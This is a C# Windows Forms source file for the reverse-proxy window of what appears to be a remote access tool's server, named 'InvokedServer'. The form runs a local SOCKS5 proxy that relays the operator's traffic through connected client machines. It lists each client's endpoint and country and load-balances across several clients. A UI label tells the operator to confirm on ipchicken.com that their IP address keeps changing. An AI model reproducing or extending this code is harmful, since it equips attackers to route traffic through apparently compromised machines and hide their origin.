

using System;
using System.Globalization;
using System.Net.Sockets;
using System.Windows.Forms;
using InvokedCommon.Helpers;
using InvokedCommon.Messages;
using InvokedServer.Helper;
using InvokedServer.Messages;
using InvokedServer.Models;
using InvokedServer.Networking;
using InvokedServer.ReverseProxy;


namespace InvokedServer.Forms
{
	public partial class FrmReverseProxy : Form
	{
		private readonly Client[] _clients;
		private readonly ReverseProxyHandler _reverseProxyHandler;
		private ReverseProxyClient[] _openConnections;

		public FrmReverseProxy(Client[] clients)
		{
			this._clients = clients;
			this._reverseProxyHandler = new ReverseProxyHandler(clients);
			this.RegisterMessageHandler();
			this.InitializeComponent();
		}

		private void RegisterMessageHandler()
		{
			this._reverseProxyHandler.ProgressChanged += new MessageProcessorBase<ReverseProxyClient[]>.ReportProgressEventHandler(this.ConnectionChanged);
			MessageHandler.Register((IMessageProcessor)this._reverseProxyHandler);
		}

		private void UnregisterMessageHandler()
		{
			MessageHandler.Unregister((IMessageProcessor)this._reverseProxyHandler);
			this._reverseProxyHandler.ProgressChanged -= new MessageProcessorBase<ReverseProxyClient[]>.ReportProgressEventHandler(this.ConnectionChanged);
		}

		private void ClientDisconnected(Client client, bool connected)
		{
			if (connected)
				return;
			this.Invoke(new MethodInvoker(((Form)this).Close));
		}

		private void FrmReverseProxy_Load(object sender, EventArgs e)
		{
			if (this._clients.Length > 1)
			{
				this.Text = "Reverse Proxy [Load-Balancer is active]";
				this.lblLoadBalance.Text = "The Load Balancer is active, " + this._clients.Length.ToString() + " clients will be used as proxy\r\nKeep refreshing at www.ipchicken.com to see if your ip address will keep changing, if so, it works";
			}
			else if (this._clients.Length == 1)
			{
				this.Text = WindowHelper.GetWindowTitle("Reverse Proxy", this._clients[0]);
				this.lblLoadBalance.Text = "The Load Balancer is not active, only 1 client is used, select multiple clients to activate the load balancer";
			}
			this.nudServerPort.Value = (Decimal)Settings.ReverseProxyPort;
		}

		private void FrmReverseProxy_FormClosing(object sender, FormClosingEventArgs e)
		{
			Settings.ReverseProxyPort = this.GetPortSafe();
			this.UnregisterMessageHandler();
			this._reverseProxyHandler.Dispose();
		}

		private void ConnectionChanged(object sender, ReverseProxyClient[] proxyClients)
		{
			lock (this._reverseProxyHandler)
			{
				this.lstConnections.BeginUpdate();
				this._openConnections = proxyClients;
				this.lstConnections.VirtualListSize = this._openConnections.Length;
				this.lstConnections.EndUpdate();
			}
		}

		private void btnStart_Click(object sender, EventArgs e)
		{
			try
			{
				ushort portSafe = this.GetPortSafe();
				if (portSafe == (ushort)0)
				{
					int num = (int)MessageBox.Show("Please enter a valid port > 0.", "Please enter a valid port", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				}
				else
				{
					this._reverseProxyHandler.StartReverseProxyServer(portSafe);
					this.ToggleConfigurationButtons(true);
				}
			}
			catch (SocketException ex)
			{
				if (ex.ErrorCode == 10048)
				{
					int num1 = (int)MessageBox.Show("The port is already in use.", "Listen Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
				else
				{
					int num2 = (int)MessageBox.Show(string.Format("An unexpected socket error occurred: {0}\n\nError Code: {1}", (object)ex.Message, (object)ex.ErrorCode), "Unexpected Listen Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
			}
			catch (Exception ex)
			{
				int num = (int)MessageBox.Show("An unexpected error occurred: " + ex.Message, "Unexpected Listen Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		private ushort GetPortSafe()
		{
			ushort result;
			return ushort.TryParse(this.nudServerPort.Value.ToString((IFormatProvider)CultureInfo.InvariantCulture), out result) ? result : (ushort)0;
		}

		private void ToggleConfigurationButtons(bool started)
		{
			this.btnStart.Enabled = !started;
			this.nudServerPort.Enabled = !started;
			this.btnStop.Enabled = started;
		}

		private void btnStop_Click(object sender, EventArgs e)
		{
			this.ToggleConfigurationButtons(false);
			this._reverseProxyHandler.StopReverseProxyServer();
		}

		private void nudServerPort_ValueChanged(object sender, EventArgs e)
		{
			this.lblProxyInfo.Text = string.Format("Connect to this SOCKS5 Proxy: 127.0.0.1:{0} (no user/pass)", (object)this.nudServerPort.Value);
		}

		private void LvConnections_RetrieveVirtualItem(object sender, RetrieveVirtualItemEventArgs e)
		{
			lock (this._reverseProxyHandler)
			{
				if (e.ItemIndex >= this._openConnections.Length)
					return;
				ReverseProxyClient openConnection = this._openConnections[e.ItemIndex];
				e.Item = new ListViewItem(new string[7]
				{
		  openConnection.Client.EndPoint.ToString(),
		  openConnection.Client.Value.Country,
		  openConnection.HostName.Length <= 0 || !(openConnection.HostName != openConnection.TargetServer) ? openConnection.TargetServer : string.Format("{0}  ({1})", (object) openConnection.HostName, (object) openConnection.TargetServer),
		  openConnection.TargetPort.ToString(),
		  StringHelper.GetHumanReadableFileSize(openConnection.LengthReceived),
		  StringHelper.GetHumanReadableFileSize(openConnection.LengthSent),
		  openConnection.Type.ToString()
				})
				{
					Tag = (object)openConnection
				};
			}
		}

		private void killConnectionToolStripMenuItem_Click(object sender, EventArgs e)
		{
			lock (this._reverseProxyHandler)
			{
				if (this.lstConnections.SelectedIndices.Count <= 0)
					return;
				int[] dest = new int[this.lstConnections.SelectedIndices.Count];
				this.lstConnections.SelectedIndices.CopyTo((Array)dest, 0);
				foreach (int index in dest)
				{
					if (index < this._openConnections.Length)
						this._openConnections[index]?.Disconnect();
				}
			}
		}
	}
}